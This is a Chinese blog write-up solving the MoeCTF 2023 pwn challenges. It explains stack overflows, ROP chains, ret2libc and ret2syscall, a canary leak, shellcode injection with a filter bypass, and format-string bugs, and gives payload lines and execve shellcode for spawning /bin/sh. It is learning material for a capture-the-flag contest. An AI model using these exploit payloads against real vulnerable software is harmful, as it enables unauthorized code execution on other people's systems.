<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>MoeCTF 2023 Pwn 题目复现 | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="MoeCTF 2023 Pwn 题目复现 | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/MoeCTF-2023-Pwn-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="moectf2023-pwn-writeup" class="scroll-target"><a href="#moectf2023-pwn-writeup"><code class="hash inline-code">#</code>MoeCTF2023 Pwn WriteUp</a></h1>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>前言</a></h2>
<p>今年暑假比较摆烂... 最后也没做完 MoeCTF 的 pwn 题, 只能赛后抽时间复现一遍. 复现一遍之后还是复习了不少知识点, 写一篇 wp 以作笔记.</p>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>题目复现</a></h2>
<h3 id="test_nc" class="scroll-target"><a href="#test_nc"><code class="hash inline-code">#</code>test_nc</a></h3>
<p>连接即可.</p>
<h3 id="baby_calculator" class="scroll-target"><a href="#baby_calculator"><code class="hash inline-code">#</code>baby_calculator</a></h3>
<p>emmm 打一个交互就可以了.</p>
<h3 id="fd" class="scroll-target"><a href="#fd"><code class="hash inline-code">#</code>fd</a></h3>
<p>fd 即 file descripter, 又叫文件描述符, 它是一个抽象的指示符, 用一个非负整数表示.它指向了由系统内核维护的一个 file table 中的某个条目 ( entry ), 后者又指向储存文件真实地址的 inode table.</p>
<p>一般来说操作系统会为每个用户进程预留三个默认的 fd: <code class="inline-code">stdin</code>, <code class="inline-code">stdout</code>, <code class="inline-code">stderr</code>. 它们对应的非负整数值分别为 <code class="inline-code">0</code>, <code class="inline-code">1</code>, <code class="inline-code">2</code>. 之后的 fd 从 <code class="inline-code">3</code> 开始分配.</p>
<p>反编译得到核心代码:</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">fd </span><span style="color:#999999">=</span><span style="color:#59873A"> open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./flag</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">new_fd </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> fd</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">29A</span><span style="color:#999999">;</span><br><span style="color:#59873A">dup2</span><span style="color:#2993a3">(</span><span style="color:#393A34">fd</span><span style="color:#999999">,</span><span style="color:#393A34"> new_fd</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // 将 new_fd 重定向到 fd</span><br><span style="color:#59873A">close</span><span style="color:#2993a3">(</span><span style="color:#393A34">fd</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">puts</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Which file do you want to read?</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">puts</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Please input its fd: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">__isoc99_scanf</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%d</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">input</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">read</span><span style="color:#2993a3">(</span><span style="color:#393A34">input</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">uLL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">puts</span><span style="color:#2993a3">(</span><span style="color:#393A34">flag</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre></div>
<p>只需要向 flag 中读入 ./flag 的内容, 也就是输入 new_fd 即可获取 flag.</p>
<p>由 <code class="inline-code">fd = 3</code>, <code class="inline-code">new_fd = (4 * fd) | 0x29A = 12 | 0x29A = 670</code>.</p>
<h3 id="int_overflow" class="scroll-target"><a href="#int_overflow"><code class="hash inline-code">#</code>int_overflow</a></h3>
<p>整数溢出, 由于 32 位整型的最大值为 <code class="language-math math-inline">2^{32}-1</code>, 大于最大值的数据会从 4 字节处截断, 利用这个特性可以构造输入.</p>
<h3 id="ret2text_32" class="scroll-target"><a href="#ret2text_32"><code class="hash inline-code">#</code>ret2text_32</a></h3>
<p>通过 IDA 可以看到程序明显存在栈溢出漏洞，覆盖返回地址到 <code class="inline-code">b4ckdoor</code> 中的 <code class="inline-code">system</code> 函数，IDA 中的 string 窗口也可以看到 binsh 字符串。再根据 x86 函数调用知识, 函数通过栈传递参数。</p>
<p><code class="inline-code">payload = b'a' * 0x5c + p32(system_addr) + p32(0x1) + p32(binsh_addr)</code></p>
<h3 id="ret2text_64" class="scroll-target"><a href="#ret2text_64"><code class="hash inline-code">#</code>ret2text_64</a></h3>
<p>与 x86 不同，x86-64 通过寄存器传参，前 6 个参数分别在 rdi, rsi, rdx, rcx, r8, r9 中. 通过ROPgadget可以查找 <code class="inline-code">pop_rdi_ret</code> 的地址.</p>
<p><code class="inline-code">payload = b'a' * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</code></p>
<h3 id="uninitialized_key" class="scroll-target"><a href="#uninitialized_key"><code class="hash inline-code">#</code>uninitialized_key</a></h3>
<p>考察对内存的理解. 当一个程序运行于用户进程中时, 系统会分配一个虚拟内存空间, 内存里每个字里的数值并不会被初始化.</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#393A34"> __cdecl </span><span style="color:#59873A">main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">int</span><span style="color:#B07D48"> argc</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">argv</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">envp</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">  init</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  welcome</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  get_name</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  get_key</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>在 main 函数里, 调用 <code class="inline-code">get_name</code> 前会给 rsp 减去一定值以分配栈空间, 回收时会直接给 rbp 加上对应的数值回收. 调用 <code class="inline-code">get_key</code> 时分配完栈空间后并不会初始化栈, 于是 <code class="inline-code">get_name</code> 里栈上的数值会一直保留.</p>
<p>注意到 <code class="inline-code">get_name</code> 里的 age 和 get_key 里的 key 都是 <code class="inline-code">rbp-0xC</code>, 因此如果想覆盖 <code class="inline-code">key</code> 为 114514, 只需要提前将 <code class="inline-code">age</code> 覆写为 114514 即可.</p>
<h3 id="uninitialized_key_plus" class="scroll-target"><a href="#uninitialized_key_plus"><code class="hash inline-code">#</code>uninitialized_key_plus</a></h3>
<p>与上道题目略有不同, 这次 <code class="inline-code">get_name</code> 的 age 是一个长度为 24 的字符串, 字符串的起始地址为 <code class="inline-code">rbp-0x20</code>, 而 <code class="inline-code">key</code> 仍然为 <code class="inline-code">rbp-0xC</code>, 因此需要将前 (0x20 - 0xC) 个字节设置为 padding, 最后 4 个字节放置 114514.</p>
<p>注意: 不可以图省事把最后 8 个字节用 <code class="inline-code">p64(114514)</code> 处理, 这是因为根据小端序, 最终实际得到的 <code class="inline-code">rbp-0xC</code> 全为 0.</p>
<p><code class="inline-code">payload = 8 * b'a' + 8 * b'c' + 4 * b'b' + p32(114514)</code></p>
<h3 id="ret2libc" class="scroll-target"><a href="#ret2libc"><code class="hash inline-code">#</code>ret2libc</a></h3>
<p>没有给 libc, 但是可以通过 <code class="inline-code">puts</code> 函数得到 <code class="inline-code">puts@got_addr</code>, 从而确定 libc 版本, 进而得到 libc_base, 然后构造 system getshell.</p>
<p>确定 libc 版本可以使用 LibcSearcher.</p>
<p>如果栈不对齐可以通过加一个 ret 滑板解决.</p>
<h3 id="ret2syscall" class="scroll-target"><a href="#ret2syscall"><code class="hash inline-code">#</code>ret2syscall</a></h3>
<p>通过 ROPgadget 查看需要的 gadget, 然后根据 x86-64 下函数调用栈规则构造 <code class="inline-code">execve(&quot;/bin/sh&quot;, 0, 0)</code>, 注意 execve 的系统调用号是 0x3b.</p>
<p><code class="inline-code">payload = b'a' * (64 + 8) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(pop_rax_ret_addr) + p64(59) + p64(syscall_addr)</code></p>
<h3 id="pie" class="scroll-target"><a href="#pie"><code class="hash inline-code">#</code>PIE</a></h3>
<p>题目虽然打开了 PIE 对代码段进行了地址随机化, 但是由于给出了 <code class="inline-code">vuln_addr</code>, 可以得到 PIE_base, 进而可以确定程序运行时其他各个函数的实际地址, 再构造 <code class="inline-code">system</code> 函数调用栈即可.</p>
<p>由于这道题目有 call system 这种 gadget, 所以 payload 更容易构造了:</p>
<p><code class="inline-code">payload = b'a' * 80 + b'bbbbbbbb' + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(call_system_addr)</code></p>
<h3 id="little_canary" class="scroll-target"><a href="#little_canary"><code class="hash inline-code">#</code>little_canary</a></h3>
<p>这道题目打开了 canary 保护, 但是由于程序会直接打印紧挨着 canary 的 buf, 而 read buf 又存在溢出, 因此可以通过 buf 覆盖 canary 的最低一字节的 <code class="inline-code">\x00</code>, 继而 <code class="inline-code">printf</code> 时会直接把 canary 的其余 7 字节打印出来.</p>
<p>得到了 canary, 这道题目的其余部分和 ret2libc 便别无二致.</p>
<p>注意: lead canary 时只需要 <code class="inline-code">sendline(b'a' * 72)</code>, 字节流第 73 位就是 <code class="inline-code">0xa</code> (即换行符).</p>
<h3 id="repwnse" class="scroll-target"><a href="#repwnse"><code class="hash inline-code">#</code>rePWNse</a></h3>
<p>简单读一下, 发现 makebinsh 函数只有在 7 个变量满足特定的条件时才可以拼接为 <code class="inline-code">&quot;/bin/sh&quot;</code>, 并且会给出这个字符串的地址. 据此得到一个 7 元一次方程组, z3 求解即可.</p>
<p>得到了 <code class="inline-code">&quot;/bin/sh&quot;</code>, 同时在函数列表里看到一个 <code class="inline-code">action</code> 函数, 已经基本构造好了 <code class="inline-code">execve</code> 的函数调用栈, 利用栈溢出传入 <code class="inline-code">&quot;/bin/sh&quot;</code> 后直接调用皆可.</p>
<h3 id="shellcode_level0" class="scroll-target"><a href="#shellcode_level0"><code class="hash inline-code">#</code>shellcode_level0</a></h3>
<p>打一个 COP. 程序没有打开 NX 保护, 也就是说栈可执行. 并且程序逻辑是读入一个 buf, 然后 <code class="inline-code">call buf</code>, 那么直接给 buf 发送一个 shellcode 即可.</p>
<p><code class="inline-code">payload = asm(shellcraft.sh())</code></p>
<h3 id="shellcode_level1" class="scroll-target"><a href="#shellcode_level1"><code class="hash inline-code">#</code>shellcode_level1</a></h3>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">char</span><span style="color:#B07D48"> shellcode</span><span style="color:#2993a3">[</span><span style="color:#2F798A">100</span><span style="color:#2993a3">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+30h] [rbp-F0h] BYREF</span><br><span style="color:#AB5959">char</span><span style="color:#B07D48"> paper2</span><span style="color:#2993a3">[</span><span style="color:#2F798A">100</span><span style="color:#2993a3">]</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+A0h] [rbp-80h] BYREF</span><br><span style="color:#59873A">memset</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcode</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#1e754f">(</span><span style="color:#393A34">shellcode</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">memset</span><span style="color:#2993a3">(</span><span style="color:#393A34">paper2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#1e754f">(</span><span style="color:#393A34">paper2</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">paper3 </span><span style="color:#999999">=</span><span style="color:#59873A"> malloc</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">64</span><span style="color:#AB5959">uLL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">paper4 </span><span style="color:#999999">=</span><span style="color:#59873A"> mmap</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">64</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 34</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">paper5 </span><span style="color:#999999">=</span><span style="color:#59873A"> mmap</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">64</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#999999">,</span><span style="color:#2F798A"> 34</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre></div>
<p>程序开了 NX, 那么内存空间开在栈上的 <code class="inline-code">shellcode[100]</code> 和 <code class="inline-code">paper2[100]</code> 由于没有可执行权限, 自然不能使用. 而 <code class="inline-code">paper3</code> 是 <code class="inline-code">malloc</code> 在堆上的, 也没有执行权限, 也不能使用.</p>
<p>目光落在了 <code class="inline-code">paper4</code> 和 <code class="inline-code">paper5</code> 上, 这两个东西的主要区别就在于前者的 <code class="inline-code">mprotect</code> 赋予了可读可写可执行, 而后者则什么都没有.</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#59873A">mprotect</span><span style="color:#2993a3">(</span><span style="color:#393A34">paper4</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1000</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">mprotect</span><span style="color:#2993a3">(</span><span style="color:#393A34">paper5</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1000</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre></div>
<p>那么就先 <code class="inline-code">choose 4</code>, 然后发个 <code class="inline-code">shellcode</code> 过去即可.</p>
<h3 id="shellcode_level2" class="scroll-target"><a href="#shellcode_level2"><code class="hash inline-code">#</code>shellcode_level2</a></h3>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-x86asm language-x86asm"><span style="color:#59873A">.text</span><span style="color:#393A34">:000000000000123C </span><span style="color:#2F798A">48</span><span style="color:#2F798A"> 8D</span><span style="color:#2F798A"> 45</span><span style="color:#2F798A"> 90</span><span style="color:#AB5959">                   lea</span><span style="color:#1E754F">     rax</span><span style="color:#393A34">, </span><span style="color:#2993a3">[</span><span style="color:#1E754F">rbp</span><span style="color:#393A34">+s</span><span style="color:#2993a3">]</span><br><span style="color:#59873A">.text</span><span style="color:#393A34">:</span><span style="color:#2F798A">0000000000001240</span><span style="color:#393A34"> 0F B6 </span><span style="color:#2F798A">00</span><span style="color:#AB5959">                      movzx</span><span style="color:#1E754F">   eax</span><span style="color:#393A34">, </span><span style="color:#AB5959">byte</span><span style="color:#393A34"> ptr </span><span style="color:#2993a3">[</span><span style="color:#1E754F">rax</span><span style="color:#2993a3">]</span><br><span style="color:#59873A">.text</span><span style="color:#393A34">:</span><span style="color:#2F798A">0000000000001243</span><span style="color:#2F798A"> 84</span><span style="color:#393A34"> C0                         </span><span style="color:#AB5959">test</span><span style="color:#1E754F">    al</span><span style="color:#393A34">, </span><span style="color:#1E754F">al</span><br><span style="color:#59873A">.text</span><span style="color:#393A34">:</span><span style="color:#2F798A">0000000000001245</span><span style="color:#2F798A"> 74</span><span style="color:#2F798A"> 16</span><span style="color:#AB5959">                         jz</span><span style="color:#393A34">      short loc_125D</span><br></code></pre></div>
<p>ida 打开, 简单阅读汇编代码可以得知, 如果输入的字符串 <code class="inline-code">s</code> 的最低位不为 0, 则会将整个 shellcode <code class="inline-code">memset</code>.</p>
<p>据此, 往原先有的 payload 后面加个 <code class="inline-code">\x00</code> 即可.</p>
<p><code class="inline-code">payload = b'\x00' + asm(shellcraft.sh())</code></p>
<p>注意小段序的性质: 为了使 rax 内存低位为 0, 那么字符串 s 的内存低位就为 0, 那么 payload 的内存低位就应该为 0, 那么 payload 的数值高位就为 0. 故 <code class="inline-code">\x00</code> 在最开头.</p>
<h3 id="shellcode_level3" class="scroll-target"><a href="#shellcode_level3"><code class="hash inline-code">#</code>shellcode_level3</a></h3>
<p>首先 checksec 分析题目, 注意到程序关闭了 PIE 函数地址随机化, 并且 ida 反编译可以查看得存在后门函数 <code class="inline-code">givemeshell</code>.</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#393A34"> __cdecl </span><span style="color:#59873A">main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">int</span><span style="color:#B07D48"> argc</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">argv</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">envp</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">    puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">5 bytes ni neng miao sha wo?</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    mprotect</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">GLOBAL_OFFSET_TABLE_</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1000</span><span style="color:#AB5959">uLL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    gets</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">code</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    memset</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">unk_40408E</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">F72</span><span style="color:#AB5959">uLL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">(</span><span style="color:#393A34">code</span><span style="color:#1e754f">)</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>程序逻辑大概是向 .bss 段上的全局变量 <code class="inline-code">code</code> 读入一段不定长度的数据, 但是进一步分析可得知实际可以利用的长度只有 5 bytes, 这是因为程序里的 <code class="inline-code">memset</code> 会把 code+5 之后的所有内容清空, 故可以利用的大小只有 5 bytes.</p>
<p>不过我们的 <code class="inline-code">givemeshell</code> 函数地址固定为 <code class="inline-code">0x4011D6</code> 为 3 bytes, 所以是绰绰有余的.</p>
<p>需要注意的地方是, 由于 <code class="inline-code">call</code> 指令跳转时使用的是相对偏移量, 所以实际上需要填入的地址是 <code class="inline-code">code_addr - givemeshell_addr</code>, 但是又因为 python 理论上是没有数据范围的, 也就是说 python 没有最高位这个说法, 所以我们需要手动把得到的负数转为对应的 4 字节数字, 也就是 <code class="inline-code">0xffffffff &amp; (givemeshell_addr - code_addr)</code>.</p>
<h3 id="changeable_shellcode" class="scroll-target"><a href="#changeable_shellcode"><code class="hash inline-code">#</code>changeable_shellcode</a></h3>
<p>checksec 分析题目, 注意到保护全开, 只能利用题目中现有的内容构造 payload.</p>
<p>输入的 shellcode 会被复制到 <code class="inline-code">0x11451400</code> 这个位置, 看似很简单设置 payload 为 shellcode 即可, 但是由于 <code class="inline-code">filter</code> 函数过滤了所有 shellcode 必有的 <code class="inline-code">\xf</code> 和 <code class="inline-code">\x5</code>, 因此直接输入裸的 shellcode 会被 ban 掉.</p>
<p>考虑一种绕过方式是把 shellcode 中已有的 <code class="inline-code">\xf</code> 或者 <code class="inline-code">\x5</code> 两者之一修改掉, 绕过输入判断后执行 shellcode 时再改回来, 即可 get shell.</p>
<p>为了方便期间, 确定 shellcode 中替换掉 <code class="inline-code">\x5</code> 为 <code class="inline-code">\x00</code>, 然后再在 shellcode 前加入 asm 修改 <code class="inline-code">\x00</code> 的位置为 <code class="inline-code">\x5</code>. 现在的问题在于如何确定 <code class="inline-code">\x5</code> 的位置. 根据小端序的知识, shellcode 的 &quot;数值低位&quot; 应该在 &quot;内存高位&quot;, 具体位置通过动态调试两次即可确定.</p>
<p>payload 构造方法如下:</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#393A34">shellcode </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x00</span><span style="color:#B5695977">"</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><br><span style="color:#B5695977">    """</span><br><span style="color:#B56959">    mov al, 0x05</span><br><span style="color:#B56959">    mov [0x114514025], al</span><br><span style="color:#B5695977">    """</span><br><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> shellcode</span><br></code></pre></div>
<p>注意: 尽量使用 <code class="inline-code">\x05</code> 含量少且位置易于确定的 shellcode, 虽然不影响正确性, 但是可能增加调试时间.</p>
<h3 id="format_level0" class="scroll-target"><a href="#format_level0"><code class="hash inline-code">#</code>format_level0</a></h3>
<p>格式化字符串入门题目, 考点是通过格式化字符串泄漏栈上的内容.</p>
<p><code class="inline-code">payload = b&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p&quot;</code></p>
<h3 id="format_level1" class="scroll-target"><a href="#format_level1"><code class="hash inline-code">#</code>format_level1</a></h3>
<p>先说非预期解, 根据题目设定, 只需要主人公的 HP 和攻击力都高于龙, 沉淀上 114514 次就应该能过, 不过就是脚本跑着比较慢.</p>
<p>预期解/考点是: 通过格式化字符串漏洞, 将龙的 HP 修改为极小值, 从而缩减过关时间.</p>
<p>payload 有两种构造方式: 将龙的 HP 变量的地址放在内存低地址或内存高地址.</p>
<p>两种构造方式都可以对, 只需要保证字节对齐以免夹断即可.</p>
